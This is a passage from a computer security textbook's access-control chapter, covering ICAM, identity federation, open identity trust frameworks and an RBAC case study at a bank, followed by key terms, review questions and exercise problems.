to:\\r\\n• Create trusted digital identity representations of individuals and what the \\r\\nICAM documents refer to as nonperson entities (NPEs). The latter include \\r\\nprocesses, applications, and automated devices seeking access to a resource.\\r\\n• Bind those identities to credentials that may serve as a proxy for the individual \\r\\nor NPE in access transactions. A credential is an object or data structure that \\r\\nauthoritatively binds an identity (and optionally, additional attributes) to a \\r\\ntoken possessed and controlled by a subscriber.\\r\\n• Use the credentials to provide authorized access to an agency’s resources.\\r\\nFigure 4.12 provides an overview of the logical components of an ICAM archi\\ufffetecture. We will examine each of the main components in the following subsections.\\r\\nIdentity Management\\r\\nIdentity management is concerned with assigning attributes to a digital identity and \\r\\nconnecting that digital identity to an individual or NPE. The goal is to establish a \\r\\nFigure 4.12 Identity, Credential, and Access Management (ICAM)\\r\\nCredential Management\\r\\nIdentity federation\\r\\nAccess management\\r\\nProvisioning/deprovisioning\\r\\nSponsorship Enrollment\\r\\nIssuance\\r\\nCredential\\r\\nlifecycle\\r\\nmanagement\\r\\nCredential\\r\\nproduction\\r\\nResource\\r\\nmanagement\\r\\nPrivilege\\r\\nmanagement\\r\\nPolicy\\r\\nmanagement\\r\\nPhysical\\r\\naccess\\r\\nLogical\\r\\naccess\\r\\nExternal\\r\\nagency\\r\\nState or local\\r\\ngovernment\\r\\nBusiness\\r\\npartner\\r\\nCitizen\\r\\nIdentity Management\\r\\nBackground\\r\\ninvestigation On-boarding\\r\\nDigital identity\\r\\nlifecycle\\r\\nmanagement\\r\\nAuthoritative attribute sources\\r\\nM04_STAL0611_04_GE_C04.indd 155 10/11/17 2:47 PM\\n\\n\\n156 CHAPTER 4 / ACCESS CONTROL\\r\\ntrustworthy digital identity that is independent of a specific application or context. \\r\\nThe traditional, and still most common, approach to access control for applications \\r\\nand programs is to create a digital representation of an identity for the specific use of \\r\\nthe application or program. As a result, maintenance and protection of the identity \\r\\nitself is treated as secondary to the mission associated with the application. Further, \\r\\nthere is considerable overlap in effort in establishing these application-specific \\r\\nidentities.\\r\\nUnlike accounts used to log on to networks, systems, or applications, enterprise \\r\\nidentity records are not tied to job title, job duties, location, or whether access is needed \\r\\nto a specific system. Those items may become attributes tied to an enterprise identity \\r\\nrecord, and may also become part of what uniquely identifies an individual in a specific \\r\\napplication. Access control decisions will be based on the context and relevant attri\\ufffebutes of a user—not solely their identity. The concept of an enterprise identity is that \\r\\nindividuals will have a single digital representation of themselves that can be lever\\ufffeaged across departments and agencies for multiple purposes, including access control.\\r\\nFigure 4.12 depicts the key functions involved in identity management. Estab\\ufffelishment of a digital identity typically begins with collecting identity data as part of \\r\\nan enrollment process. A digital identity is often comprised of a set of attributes that \\r\\nwhen aggregated uniquely identify a user within a system or an enterprise. In order to \\r\\nestablish trust in the individual represented by a digital identity, an agency may also \\r\\nconduct a background investigation. Attributes about an individual may be stored in \\r\\nvarious authoritative sources within an agency and linked to form an enterprise view \\r\\nof the digital identity. This digital identity may then be provisioned into applications \\r\\nin order to support physical and logical access (part of Access Management) and \\r\\nde-provisioned when access is no longer required.\\r\\nA final element of identity management is lifecycle management, which \\r\\nincludes the following:\\r\\n• Mechanisms, policies, and procedures for protecting personal identity \\r\\ninformation\\r\\n• Controlling access to identity data\\r\\n• Techniques for sharing authoritative identity data with applications that need it\\r\\n• Revocation of an enterprise identity\\r\\nCredential Management\\r\\nAs mentioned, a credential is an object or data structure that authoritatively binds \\r\\nan identity (and optionally, additional attributes) to a token possessed and controlled \\r\\nby a subscriber. Examples of credentials are smart cards, private/public cryptographic \\r\\nkeys, and digital certificates. Credential management is the management of the life \\r\\ncycle of the credential. Credential management encompasses the following five logi\\ufffecal components:\\r\\n1. An authorized individual sponsors an individual or entity for a credential to\\r\\nestablish the need for the credential. For example, a department supervisor \\r\\nsponsors a department employee.\\r\\n2. The sponsored individual enrolls for the credential, a process which typically con\\ufffesists of identity proofing and the capture of biographic and biometric data. This \\r\\nM04_STAL0611_04_GE_C04.indd 156 10/11/17 2:47 PM\\n\\n\\n4.7 / IDENTITY, CREDENTIAL, AND ACCESS MANAGEMENT 157\\r\\nstep may also involve incorporating authoritative attribute data, maintained by \\r\\nthe identity management component.\\r\\n3. A credential is produced. Depending on the credential type, production may \\r\\ninvolve encryption, the use of a digital signature, the production of a smartcard, \\r\\nor other functions.\\r\\n4. The credential is issued to the individual or NPE.\\r\\n5. Finally, a credential must be maintained over its life cycle, which might include \\r\\nrevocation, reissuance/replacement, reenrollment, expiration, personal identi\\ufffefication number (PIN) reset, suspension, or reinstatement.\\r\\nAccess Management\\r\\nThe access management component deals with the management and control of \\r\\nthe ways entities are granted access to resources. It covers both logical and physi\\ufffecal access, and may be internal to a system or an external element. The purpose of \\r\\naccess management is to ensure that the proper identity verification is made when an \\r\\nindividual attempts to access security-sensitive buildings, computer systems, or data. \\r\\nThe access control function makes use of credentials presented by those requesting \\r\\naccess and the digital identity of the requestor. Three support elements are needed \\r\\nfor an enterprise-wide access control facility:\\r\\n• Resource management: This element is concerned with defining rules for a \\r\\nresource that requires access control. The rules would include credential \\r\\nrequirements and what user attributes, resource attributes, and environmental \\r\\nconditions are required for access of a given resource for a given function.\\r\\n• Privilege management: This element is concerned with establishing and main\\ufffetaining the entitlement or privilege attributes that comprise an individual’s \\r\\naccess profile. These attributes represent features of an individual that can be \\r\\nused as the basis for determining access decisions to both physical and logical \\r\\nresources. Privileges are considered attributes that can be linked to a digital \\r\\nidentity.\\r\\n• Policy management: This element governs what is allowable and unallowable in \\r\\nan access transaction. That is, given the identity and attributes of the requestor, \\r\\nthe attributes of the resource or object, and environmental conditions, a policy \\r\\nspecifies what actions this user can perform on this object.\\r\\nIdentity Federation\\r\\nIdentity federation addresses two questions:\\r\\n1. How do you trust identities of individuals from external organizations who need \\r\\naccess to your systems?\\r\\n2. How do you vouch for identities of individuals in your organization when they \\r\\nneed to collaborate with external organizations?\\r\\nIdentity federation is a term used to describe the technology, standards, policies, \\r\\nand processes that allow an organization to trust digital identities, identity attributes, \\r\\nand credentials created and issued by another organization. We will discuss identity \\r\\nfederation in the following section.\\r\\nM04_STAL0611_04_GE_C04.indd 157 10/11/17 2:47 PM\\n\\n\\n158 CHAPTER 4 / ACCESS CONTROL\\r\\n4.8 TRUST FRAMEWORKS\\r\\nThe interrelated concepts of trust, identity, and attributes have become core concerns \\r\\nof Internet businesses, network service providers, and large enterprises. These concerns \\r\\ncan clearly be seen in the e-commerce setting. For efficiency, privacy, and legal simplic\\ufffeity, parties to transactions generally apply the need-to-know principle: What do you need \\r\\nto know about someone in order to deal with them? The answer varies from case to case, \\r\\nand includes such attributes as professional registration or license number, organization \\r\\nand department, staff ID, security clearance, customer reference number, credit card \\r\\nnumber, unique health identifier, allergies, blood type, Social Security number, address, \\r\\ncitizenship status, social networking handle, pseudonym, and so on. The attributes of an \\r\\nindividual that must be known and verified to permit a transaction depend on context.\\r\\nThe same concern for attributes is increasingly important for all types of access \\r\\ncontrol situations, not just the e-business context. For example, an enterprise may \\r\\nneed to provide access to resources for customers, users, suppliers, and partners. \\r\\nDepending on context, access will be determined not just by identity, but by the \\r\\nattributes of the requestor and the resource.\\r\\nTraditional Identity Exchange Approach\\r\\nOnline or network transactions involving parties from different organizations, or \\r\\nbetween an organization and an individual user such as an online customer, gener\\ufffeally require the sharing of identity information. This information may include a host \\r\\nof associated attributes in addition to a simple name or numerical identifier. Both \\r\\nthe party disclosing the information and the party receiving the information need \\r\\nto have a level of trust about security and privacy issues related to that information.\\r\\nFigure 4.13a shows the traditional technique for the exchange of identity infor\\ufffemation. This involves users developing arrangements with an identity service provider\\r\\nto procure digital identity and credentials, and arrangements with parties that provide \\r\\nend-user services and applications and that are willing to rely on the identity and \\r\\ncredential information generated by the identity service provider.\\r\\nThe arrangement of Figure 4.13a must meet a number of requirements. The \\r\\nrelying party requires that the user has been authenticated to some degree of assur\\ufffeance, that the attributes imputed to the user by the identity service provider are accu\\uffferate, and that the identity service provider is authoritative for those attributes. The \\r\\nidentity service provider requires assurance that it has accurate information about the \\r\\nuser and that, if it shares information, the relying party will use it in accordance with \\r\\ncontractual terms and conditions and the law. The user requires assurance that the \\r\\nidentity service provider and relying party can be entrusted with sensitive information \\r\\nand that they will abide by the user’s preferences and respect the user’s privacy. Most \\r\\nimportantly, all the parties want to know if the practices described by the other par\\ufffeties are actually those implemented by the parties, and how reliable those parties are.\\r\\nOpen Identity Trust Framework\\r\\nWithout some universal standard and framework, the arrangement of Figure 4.13a must \\r\\nbe replicated in multiple contexts. A far preferable approach is to develop an open, \\r\\nM04_STAL0611_04_GE_C04.indd 158 10/11/17 2:47 PM\\n\\n\\n4.8 / TRUST FRAMEWORKS 159\\r\\nstandardized approach to trustworthy identity and attribute exchange. In the remain\\ufffeder of this section, we examine such an approach that is gaining increasing acceptance.\\r\\nUnfortunately, this topic is burdened with numerous acronyms, so it is best to \\r\\nbegin with a definition of the most important of these:\\r\\n• OpenID: This is an open standard that allows users to be authenticated by \\r\\ncertain cooperating sites (known as Relying Parties) using a third party service, \\r\\neliminating the need for Webmasters to provide their own ad hoc systems and \\r\\nallowing users to consolidate their digital identities. Users may create accounts \\r\\nwith their preferred OpenID identity providers, then use those accounts as the \\r\\nbasis for signing on to any Web site that accepts OpenID authentication.\\r\\nFigure 4.13 Identity Information Exchange Approaches\\r\\n(a) Traditional triangle of parties involved in an exchange of identity information\\r\\n(b) Identity attribute exchange elements\\r\\n(Possible contract)\\r\\nTerms of service\\r\\n(TOS) agreement\\r\\nTerms of service\\r\\n(TOS) agreement\\r\\nIdentity\\r\\nservice\\r\\nprovider\\r\\nIdentity\\r\\nservice\\r\\nproviders\\r\\nRelying\\r\\nparty\\r\\nRelying\\r\\nparties\\r\\nUsers\\r\\nUsers\\r\\nTrust framework\\r\\nproviders\\r\\nAssessors\\r\\n& auditors\\r\\nDispute\\r\\nresolvers\\r\\nAttribute providers\\r\\nAttribute exchange\\r\\nnetwork\\r\\nM04_STAL0611_04_GE_C04.indd 159 10/11/17 2:47 PM\\n\\n\\n160 CHAPTER 4 / ACCESS CONTROL\\r\\n• OIDF: The OpenID Foundation is an international nonprofit organization of \\r\\nindividuals and companies committed to enabling, promoting, and protecting \\r\\nOpenID technologies. OIDF assists the community by providing needed infra\\ufffestructure and help in promoting and supporting expanded adoption of OpenID.\\r\\n• ICF:The Information Card Foundation is a nonprofit community of companies \\r\\nand individuals working together to evolve the Information Card ecosystem. \\r\\nInformation Cards are personal digital identities people can use online, and the \\r\\nkey component of identity metasystems. Visually, each Information Card has \\r\\na card-shaped picture and a card name associated with it that enable people \\r\\nto organize their digital identities and to easily select one they want to use for \\r\\nany given interaction.\\r\\n• OITF:The Open Identity Trust Framework is a standardized, open specification \\r\\nof a trust framework for identity and attribute exchange, developed jointly by \\r\\nOIDF and ICF.\\r\\n• OIX: The Open Identity Exchange Corporation is an independent, neutral, \\r\\ninternational provider of certification trust frameworks conforming to the \\r\\nOpen Identity Trust Frameworks model.\\r\\n• AXN: An Attribute Exchange Network (AXN) is an online Internet-scale \\r\\ngateway for identity service providers and relying parties to efficiently access \\r\\nuser-asserted, permissioned, and verified online identity attributes in high \\r\\nvolumes at affordable costs.\\r\\nSystem managers need to be able to trust that the attributes associated with a \\r\\nsubject or an object are authoritative and are exchanged securely. One approach to \\r\\nproviding that trust within an organization is the ICAM model, specifically the ICAM \\r\\ncomponents (see Figure 4.12). Combined with an identity federation functionality \\r\\nthat is shared with other organizations, attributes can be exchanged in a trust-worthy \\r\\nfashion, supporting secure access control.\\r\\nIn digital identity systems, a trust framework functions as a certification program. \\r\\nIt enables a party who accepts a digital identity credential (called the relying party) to \\r\\ntrust the identity, security, and privacy policies of the party who issues the credential \\r\\n(called the identity service provider) and vice versa. More formally, OIX defines a \\r\\ntrust framework as a set of verifiable commitments from each of the various par\\ufffeties in a transaction to their counter parties. These commitments include (1) controls \\r\\n(including regulatory and contractual obligations) to help ensure commitments are \\r\\ndelivered and (2) remedies for failure to meet such commitments. A trust framework \\r\\nis developed by a community whose members have similar goals and perspectives. It \\r\\ndefines the rights and responsibilities of that community’s participants; specifies the \\r\\npolicies and standards specific to the community; and defines the community-specific \\r\\nprocesses and procedures that provide assurance. Different trust frameworks can exist, \\r\\nand sets of participants can tailor trust frameworks to meet their particular needs.\\r\\nFigure 4.13b shows the elements involved in the OITF. Within any given \\r\\norganization or agency, the following roles are part of the overall framework:\\r\\n• Relying parties (RPs): Also called service providers, these are entities deliver\\ufffeing services to specific users. RPs must have confidence in the identities and/or \\r\\nM04_STAL0611_04_GE_C04.indd 160 10/11/17 2:47 PM\\n\\n\\n4.8 / TRUST FRAMEWORKS 161\\r\\nattributes of their intended users, and must rely upon the various credentials \\r\\npresented to evince those attributes and identities.\\r\\n• Subjects: These are users of an RP’s services, including customers, employees, \\r\\ntrading partners, and subscribers.\\r\\n• Attribute providers (APs): APs are entities acknowledged by the community \\r\\nof interest as being able to verify given attributes as presented by subjects and \\r\\nwhich are equipped through the AXN to create conformant attribute creden\\ufffetials according to the rules and agreements of the AXN. Some APs will be \\r\\nsources of authority for certain information; more commonly APs will be bro\\ufffekers of derived attributes.\\r\\n• Identity providers (IDPs): These are entities able to authenticate user creden\\ufffetials and to vouch for the names (or pseudonyms or handles) of subjects, and \\r\\nwhich are equipped through the AXN or some other compatible Identity and \\r\\nAccess Management (IDAM) system to create digital identities that may be \\r\\nused to index user attributes.\\r\\nThere are also the following important support elements as part on an AXN:\\r\\n• Assessors: Assessors evaluate identity service providers and RPs and certify \\r\\nthat they are capable of following the OITF provider’s blueprint.\\r\\n• Auditors: These entities may be called on to check that parties’ practices have \\r\\nbeen in line with what was agreed for the OITF.\\r\\n• Dispute resolvers: These entities provide arbitration and dispute resolution \\r\\nunder OIX guidelines.\\r\\n• Trust framework providers: A trust framework provider is an organization that \\r\\ntranslates the requirements of policymakers into an own blueprint for a trust \\r\\nframework that it then proceeds to build, doing so in a way that is consistent \\r\\nwith the minimum requirements set out in the OITF specification. In almost all \\r\\ncases, there will be a reasonably obvious candidate organization to take on this \\r\\nrole, for each industry sector or large organization that decides it is appropriate \\r\\nto interoperate with an AXN.\\r\\nThe solid arrowed lines in Figure 4.13b indicate agreements with the trust \\r\\nframework provider for implementing technical, operations, and legal require\\ufffements. The dashed arrowed lines indicate other agreements potentially affected by \\r\\nthese requirements. In general terms, the model illustrated in Figure 4.13b would \\r\\noperate in the following way. Responsible persons within participating organiza\\ufffetions determine the technical, operational, and legal requirements for exchanges \\r\\nof identity information that fall under their authority. They then select OITF \\r\\nproviders to implement these requirements. These OITF providers translate the \\r\\nrequirements into a blueprint for a trust framework that may include additional \\r\\nconditions of the OITF provider. The OITF provider vets identity service provid\\ufffeers and RPs and contracts with them to follow its trust framework requirements \\r\\nwhen conducting exchanges of identity information. The contracts carry provi\\ufffesions relating to dispute resolvers, and auditors for contract interpretation and \\r\\nenforcement.\\r\\nM04_STAL0611_04_GE_C04.indd 161 10/11/17 2:47 PM\\n\\n\\n162 CHAPTER 4 / ACCESS CONTROL\\r\\n4.9 CASE STUDY: RBAC SYSTEM FOR A BANK\\r\\nThe Dresdner Bank has implemented an RBAC system that serves as a useful prac\\ufffetical example [SCHA01]. The bank uses a variety of computer applications. Many \\r\\nof these were initially developed for a mainframe environment; some of these older \\r\\napplications are now supported on a client-server network, while others remain on \\r\\nmainframes. There are also newer applications on servers. Prior to 1990, a simple \\r\\nDAC system was used on each server and mainframe. Administrators maintained a \\r\\nlocal access control file on each host and defined the access rights for each employee \\r\\non each application on each host. This system was cumbersome, time-consuming, and \\r\\nerror-prone. To improve the system, the bank introduced an RBAC scheme, which \\r\\nis systemwide and in which the determination of access rights is compartmentalized \\r\\ninto three different administrative units for greater security.\\r\\nRoles within the organization are defined by a combination of official posi\\ufffetion and job function. Table 4.5a provides examples. This differs somewhat from the \\r\\nconcept of role in the NIST standard, in which a role is defined by a job function. To \\r\\nsome extent, the difference is a matter of terminology. In any case, the bank’s role \\r\\nstructuring leads to a natural means of developing an inheritance hierarchy based \\r\\non official position. Within the bank, there is a strict partial ordering of official posi\\ufffetions within each organization, reflecting a hierarchy of responsibility and power. For \\r\\nexample, the positions Head of Division, Group Manager, and Clerk are in descend\\ufffeing order. When the official position is combined with job function, there is a resulting \\r\\nordering of access rights, as indicated in Table 4.5b. Thus, the financial analyst/Group \\r\\nManager role (role B) has more access rights than the financial analyst/Clerk role \\r\\n(role A). The table indicates that role B has as many or more access rights than role \\r\\nA in three applications and has access rights to a fourth application. On the other \\r\\nhand, there is no hierarchical relationship between office banking/Group Manager \\r\\nand financial analyst/Clerk because they work in different functional areas. We can \\r\\ntherefore define a role hierarchy in which one role is superior to another if its position \\r\\nis superior and their functions are identical. The role hierarchy makes it possible to \\r\\neconomize on access rights definitions, as suggested in Table 4.5c.\\r\\nIn the original scheme, the direct assignment of access rights to the individual \\r\\nuser occurred at the application level and was associated with the individual applica\\ufffetion. In the new scheme, an application administration determines the set of access \\r\\nrights associated with each individual application. However, a given user perform\\ufffeing a given task may not be permitted all of the access rights associated with the \\r\\napplication. When a user invokes an application, the application grants access on the \\r\\nbasis of a centrally provided security profile. A separate authorization administration \\r\\nassociated access rights with roles, and creates the security profile for a use on the \\r\\nbasis of the user’s role.\\r\\nA user is statically assigned a role. In principle (in this example), each user may \\r\\nbe statically assigned up to four roles and select a given role for use in invoking a par\\ufffeticular application. This corresponds to the NIST concept of session. In practice, most \\r\\nusers are statically assigned a single role based on the user’s position and job function.\\r\\nAll of these ingredients are depicted in Figure 4.14. The Human Resource \\r\\nDepartment assigns a unique User ID to each employee who will be using the system. \\r\\nM04_STAL0611_04_GE_C04.indd 162 10/11/17 2:47 PM\\n\\n\\n4.9 / CASE STUDY: RBAC SYSTEM FOR A BANK 163\\r\\n(a) Functions and Official Positions\\r\\nRole Function Official Position\\r\\nA financial analyst Clerk\\r\\nB financial analyst Group Manager\\r\\nC financial analyst Head of Division\\r\\nD financial analyst Junior\\r\\nE financial analyst Senior\\r\\nF financial analyst Specialist\\r\\nG financial analyst Assistant\\r\\n. . . . . . . . .\\r\\nX share technician Clerk\\r\\nY support e-commerce Junior\\r\\nZ office banking Head of Division\\r\\nTable 4.5 Functions and Roles for Banking Example\\r\\n(b) Permission Assignments\\r\\nRole Application Access Right\\r\\nA\\r\\nmoney market \\r\\ninstruments\\r\\n1, 2, 3, 4\\r\\nderivatives \\r\\ntrading\\r\\n1, 2, 3, 7, 10, 12\\r\\ninterest \\r\\ninstruments\\r\\n1, 4, 8, 12, 14, 16\\r\\nB\\r\\nmoney market \\r\\ninstruments\\r\\n1, 2, 3, 4, 7\\r\\nderivatives \\r\\ntrading\\r\\n1, 2, 3, 7, 10, 12, 14\\r\\ninterest \\r\\ninstruments\\r\\n1, 4, 8, 12, 14, 16\\r\\nprivate consumer \\r\\ninstruments\\r\\n1, 2, 4, 7\\r\\n. . .\\xa0 \\xa0. . . . . .\\r\\n(c) Permission Assignment with Inheritance\\r\\nRole Application Access Right\\r\\nA\\r\\nmoney market \\r\\ninstruments\\r\\n1, 2, 3, 4\\r\\nderivatives \\r\\ntrading\\r\\n1, 2, 3, 7, 10, 12\\r\\ninterest \\r\\ninstruments\\r\\n1, 4, 8, 12, 14, 16\\r\\nB\\r\\nmoney market \\r\\ninstruments\\r\\n7\\r\\nderivatives \\r\\ntrading\\r\\n14\\r\\nprivate \\r\\nconsumer \\r\\ninstruments\\r\\n1, 2, 4, 7\\r\\n. . .\\xa0 \\xa0. . . . . .\\r\\nBased on the user’s position and job function, the department also assigns one or \\r\\nmore roles to the user. The user/role information is provided to the Authorization \\r\\nAdministration, which creates a security profile for each user that associates the \\r\\nUser ID and role with a set of access rights. When a user invokes an application, the \\r\\napplication consults the security profile for that user to determine what subset of the \\r\\napplication’s access rights are in force for this user in this role.\\r\\nA role may be used to access several applications. Thus, the set of access rights \\r\\nassociated with a role may include access rights that are not associated with one of \\r\\nM04_STAL0611_04_GE_C04.indd 163 10/11/17 2:47 PM\\n\\n\\n164 CHAPTER 4 / ACCESS CONTROL\\r\\nFigure 4.14 Example of Access Control Administration\\r\\nApplication Administration\\r\\nAuthorization Administration\\r\\nHuman Resources Department\\r\\nN M\\r\\nN M\\r\\nFunctions\\r\\nPositions\\r\\nUser\\r\\nIDs\\r\\nAssigns\\r\\nApplication Access\\r\\nright\\r\\nRole Application\\r\\nRoles\\r\\n1 1– 4\\r\\nthe applications the user invokes. This is illustrated in Table 4.5b. Role A has numer\\ufffeous access rights, but only a subset of those rights are applicable to each of the three \\r\\napplications that role A may invoke.\\r\\nSome figures about this system are of interest. Within the bank, there are 65 \\r\\nofficial positions, ranging from a Clerk in a branch, through the Branch Manager, to a \\r\\nMember of the Board. These positions are combined with 368 different job functions \\r\\nprovided by the human resources database. Potentially, there are 23,920 different \\r\\nroles, but the number of roles in current use is about 1,300. This is in line with the \\r\\nexperience other RBAC implementations. On average, 42,000 security profiles are \\r\\ndistributed to applications each day by the Authorization Administration module.\\r\\n4.10 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\r\\nKey Terms\\r\\naccess control\\r\\naccess control list\\r\\naccess management\\r\\naccess matrix\\r\\naccess right\\r\\nattribute\\r\\nattribute-based access control \\r\\n(ABAC)\\r\\nAttribute Exchange Network \\r\\n(AXN)\\r\\nattribute provider\\r\\nauditor\\r\\nauthorizations\\r\\nassessor\\r\\ncapability ticket\\r\\ncardinality\\r\\nclosed access control policy\\r\\ncredential\\r\\nM04_STAL0611_04_GE_C04.indd 164 10/11/17 2:47 PM\\n\\n\\n4.10 / KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS 165\\r\\nReview Questions\\r\\n4.1 What is the difference between authentication and authorization?\\r\\n4.2 How does RBAC relate to DAC and MAC?\\r\\n4.3 List and define the three classes of subject in an access control system.\\r\\n4.4 List and briefly explain the three basic elements of access control.\\r\\n4.5 What is ABAC?\\r\\n4.6 What is the difference between an access control list and a capability ticket?\\r\\n4.7 List some of the main types of access control.\\r\\n4.8 Briefly define the four RBAC models of Figure 4.8a.\\r\\n4.9 What is meant by mutually exclusive roles in the RBAC3 model?\\r\\n4.10 Describe three types of role hierarchy constraints.\\r\\n4.11 In the NIST RBAC model, what is the difference between SSD and DSD?\\r\\nProblems\\r\\n4.1 For the DAC model discussed in Section 4.3, an alternative representation of the pro\\ufffetection state is a directed graph. Each subject and each object in the protection state \\r\\nis represented by a node (a single node is used for an entity that is both subject and \\r\\nobject). A directed line from a subject to an object indicates an access right, and the \\r\\nlabel on the link defines the access right.\\r\\na. Draw a directed graph that corresponds to the access matrix of Figure 4.2a.\\r\\nb. Draw a directed graph that corresponds to the access matrix of Figure 4.3.\\r\\nc. Is there a one-to-one correspondence between the directed graph representation \\r\\nand the access matrix representation? Explain.\\r\\ncredential management\\r\\ndiscretionary access control \\r\\n(DAC)\\r\\ndispute resolver\\r\\ndynamic separation of duty \\r\\n(DSD)\\r\\nentitlements\\r\\nenvironment attribute\\r\\ngeneral role hierarchy\\r\\ngroup\\r\\nidentity\\r\\nidentity, credential, and access \\r\\nmanagement (ICAM)\\r\\nidentity federation\\r\\nidentity management\\r\\nidentity provider\\r\\nInformation Card Foundation \\r\\n(ICF)\\r\\nkernel mode\\r\\nleast privilege\\r\\nlimited role hierarchy\\r\\nmandatory access control \\r\\n(MAC)\\r\\nmutually exclusive roles\\r\\nobject\\r\\nobject attribute\\r\\nopen access control policy\\r\\nOpen Identity Exchange \\r\\nCorporation (OIX)\\r\\nOpen Identity Trust \\r\\nFramework (OITF)\\r\\nOpenID\\r\\nOpenID Foundation (OIDF)\\r\\nowner\\r\\npermission\\r\\npolicy\\r\\nprerequisite role\\r\\nprivilege\\r\\nprotection domain\\r\\nrelying part\\r\\nresource\\r\\nrights\\r\\nrole-based access control \\r\\n(RBAC)\\r\\nrole constraints\\r\\nrole hierarchies\\r\\nseparation of duty\\r\\nsession\\r\\nstatic separation of duty (SSD)\\r\\nsubject\\r\\nsubject attribute\\r\\ntrust framework\\r\\ntrust framework provider\\r\\nuser mode\\r\\nM04_STAL0611_04_GE_C04.indd 165 10/11/17 2:47 PM\\n\\n\\n166 CHAPTER 4 / ACCESS CONTROL\\r\\n4.2 a. Explain, with an appropriate example, how protection domains provide flexibility.\\r\\nb. How is the concept of protection domains related to operating systems? Explain \\r\\nby quoting an example from the UNIX operating system.\\r\\n4.3 The VAX/VMS operating system makes use of four processor access modes to \\r\\nfacilitate the protection and sharing of system resources among processes. The access \\r\\nmode determines:\\r\\n• Instruction execution privileges: What instructions the processor may execute\\r\\n• Memory access privileges: Which locations in virtual memory the current instruction \\r\\nmay access\\r\\nThe four modes are as follows:\\r\\n• Kernel: Executes the kernel of the VMS operating system, which includes memory \\r\\nmanagement, interrupt handling, and I/O operations\\r\\n• Executive: Executes many of the operating system service calls, including file and \\r\\nrecord (disk and tape) management routines\\r\\n• Supervisor: Executes other operating system services, such as responses to user \\r\\ncommands\\r\\n• User: Executes user programs, plus utilities such as compilers, editors, linkers, and \\r\\ndebuggers\\r\\nA process executing in a less-privileged mode often needs to call a procedure that \\r\\nexecutes in a more-privileged mode; for example, a user program requires an oper\\ufffeating system service. This call is achieved by using a change-mode (CHM) instruc\\ufffetion, which causes an interrupt that transfers control to a routine at the new access \\r\\nmode. A return is made by executing the REI (return from exception or interrupt) \\r\\ninstruction.\\r\\na. A number of operating systems have two modes: kernel and user. What are the \\r\\nadvantages and disadvantages of providing four modes instead of two?\\r\\nb. Can you make a case for even more than four modes?\\r\\n4.4 The VMS scheme discussed in the preceding problem is often referred to as a ring pro\\ufffetection structure, as illustrated in Figure 4.15. Indeed, the simple kernel/user scheme is \\r\\na two-ring structure. A disadvantage of a ring-structured access control system is that \\r\\nit violates the principle of least privilege. For example if we wish to have an object \\r\\naccessible in ring X but not ring Y, this requires that X 6 Y. Under this arrangement \\r\\nall objects accessible in ring X are also accessible in ring Y.\\r\\na. Explain in more detail what the problem is and why least privilege is violated.\\r\\nb. Suggest a way that a ring-structured operating system can deal with this problem.\\r\\n4.5 UNIX treats file directories in the same fashion as files; that is, both are defined by the \\r\\nsame type of data structure, called an inode. As with files, directories include a nine\\ufffebit protection string. If care is not taken, this can create access control problems. For \\r\\nexample, consider a file with protection mode 644 (octal) contained in a directory with \\r\\nprotection mode 730. How might the file be compromised in this case?\\r\\n4.6 In the traditional UNIX file access model, which we describe in Section 4.4, UNIX \\r\\nsystems provide a default setting for newly created files and directories, which the \\r\\nowner may later change. The default is typically full access for the owner combined \\r\\nwith one of the following: no access for group and other, read/execute access for group \\r\\nand none for other, or read/execute access for both group and other. Briefly discuss \\r\\nthe advantages and disadvantages of each of these cases, including an example of a \\r\\ntype of organization where each would be appropriate.\\r\\n4.7 Consider user accounts on a system with a Web server configured to provide access to \\r\\nuser Web areas. In general, this uses a standard directory name, such as ‘public_html,’ \\r\\nin a user’s home directory. This acts as their user Web area if it exists. However, to \\r\\nallow the Web server to access the pages in this directory, it must have at least search \\r\\n(execute) access to the user’s home directory, read/execute access to the Web directory, \\r\\nand read access to any webpages in it. Consider the interaction of this requirement \\r\\nM04_STAL0611_04_GE_C04.indd 166 10/11/17 2:47 PM\\n\\n\\n4.10 / KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS 167\\r\\nwith the cases you discussed for the preceding problem. What consequences does this \\r\\nrequirement have? Note a Web server typically executes as a special user, and in a \\r\\ngroup that is not shared with most users on the system. Are there some circumstances \\r\\nwhen running such a Web service is simply not appropriate? Explain.\\r\\n4.8 Assume an application requires access control policies based on the applicant’s age \\r\\nand the type of funding to be provided. Using an ABAC approach, write policy rules\\r\\nfor each of the following scenarios:\\r\\na. If the applicant’s age is more than 35, only “Research Grants (RG)” can be \\r\\nprovided.\\r\\nb. If the applicant’s age is less than or equal to 35, both “RG and Travel Grants (TG)” \\r\\ncan be provided.\\r\\n4.9 Assume a system with K subject attributes, M object attributes and Range () denotes \\r\\nthe range of possible values that each attribute can take. What are the number of \\r\\nroles and permissions required for an RBAC model? What is the problem with this \\r\\napproach if additional attributes are added?\\r\\n4.10 For the NIST RBAC standard, we can define the general role hierarchy as follows:\\r\\nRH ⊆ ROLES * ROLES is a partial order on ROLES called the inheritance rela\\ufffetion, written as Ú, where r1 Ú r2 only if all permissions of r2 are also permissions of \\r\\nr1, and all users of r1 are also users of r2. Define the set authorized_permissions(ri\\r\\n) to \\r\\nbe the set of all permissions associated with role ri\\r\\n. Define the set authorized_users(ri\\r\\n)\\r\\nto be the set of all users assigned to role ri\\r\\n. Finally, node r1 is represented as an imme\\ufffediate descendant of r2 by r1 W r2, if r1 Ú r2, but no role in the role hierarchy lies \\r\\nbetween r1 and r2.\\r\\na. Using the preceding definitions, as needed, provide a formal definition of the gen\\ufffeeral role hierarchy.\\r\\nb. Provide a formal definition of a limited role hierarchy.\\r\\nFigure 4.15 VAX/VMS Access Modes\\r\\nKernel\\r\\nREI\\r\\nCHMx\\r\\nExecutive\\r\\nSupervisor\\r\\nUser\\r\\nM04_STAL0611_04_GE_C04.indd 167 10/11/17 2:47 PM\\n\\n\\n168 CHAPTER 4 / ACCESS CONTROL\\r\\n4.11 In the example of Section 4.9, use the notation Role(x). Position and Role(x). Function\\r\\nto denote the position and the function associated with role x.\\r\\na. We can define the role hierarchy for this example as one in which one role is \\r\\nsuperior to another if its position and functions are both superior. Express this \\r\\nrelationship formally.\\r\\nb. An alternative role hierarchy is one in which a role is equal to another if its posi\\ufffetion is equal, regardless of the function. Express this relationship formally.\\r\\n4.12 In the example of the online entertainment store in Section 4.6, with the finer-grained \\r\\npolicy that includes premium and regular users, describe the ABAC policy rules for \\r\\naccessing a movie, and list all the advantages of an ABAC control policy.\\r\\nM04_STAL0611_04_GE_C04.indd 168 10/11/17 2:47 